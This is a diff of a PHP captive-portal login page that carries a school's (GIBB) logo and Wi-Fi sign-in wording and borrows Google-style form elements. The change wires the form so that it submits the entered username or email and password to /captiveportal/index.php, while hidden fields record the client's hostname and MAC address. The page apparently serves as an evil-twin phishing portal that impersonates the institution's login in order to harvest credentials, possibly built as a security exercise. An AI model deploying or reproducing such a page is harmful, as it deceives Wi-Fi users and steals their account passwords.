@@ -72,12 +72,20 @@ require_once('helper.php');
                 <div class='login-content' id='login-form'>
                     <!-- GIBB Logo -->
                     <img src="assets/images/gibb.png" alt="GIBB Logo" width="50vw" class="mt-3 m-auto d-flex justify-content-center">
-                    <form method="POST" id='email-form-step' onsubmit="return false;">
+                    <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" id='email-form-step'>
                         <h1 class='g-h1'>Bei IET WLAN Anmelden</h1>
                         <h2 class='g-h2'>GIBB Account benutzen</h2>
                         <div class='login-content'>
-                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Benutzername (xyz123456)" required>
-                            <input name="password" id='password-input' type="password" class='g-input password-input mb-2' placeholder="Passwort" required>
+                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Email or phone" required>
+                            <!-- <div class="invalid-email" style='display:none;'> -->
+                                <!-- SVG for the invalid icon -->
+                                <!-- <span class="invalid-icon">
+                                    <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                                    </svg>
+                                </span><span class='invalid-email-text-span'>Enter a valid email or phone number</span>
+                            </div> -->
+                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="Password" required>
 
                             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
@@ -89,7 +97,7 @@ require_once('helper.php');
                             <div class='login-nav'>
                                 <legend class='g-legend'>&nbsp;</legend>
                                 <!-- <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div> -->
-                                <button class='gbtn-primary' id="show-image-button" onclick="show()">Weiter</button>
+                                <button class='gbtn-primary' type="submit">Next</button>
                             </div>
                         </div>
                     </form>
